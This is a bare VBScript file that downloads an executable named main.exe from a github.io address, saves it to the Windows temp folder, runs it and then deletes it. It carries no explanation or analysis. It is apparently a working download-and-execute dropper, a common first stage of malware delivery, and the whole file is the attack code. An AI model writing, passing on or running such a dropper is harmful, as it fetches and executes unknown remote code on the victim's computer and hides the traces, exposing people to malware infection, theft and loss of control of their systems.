Set x=CreateObject("MSXML2.XMLHTTP")
x.Open "GET","https://homleds.github.io/main.exe",False
x.Send

Set fso = CreateObject("Scripting.FileSystemObject")
Set temp = fso.GetSpecialFolder(2)
tempFile = temp & "\main.exe"

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write x.responseBody
stream.SaveToFile tempFile, 2
stream.Close

CreateObject("WScript.Shell").Run tempFile
fso.DeleteFile tempFile
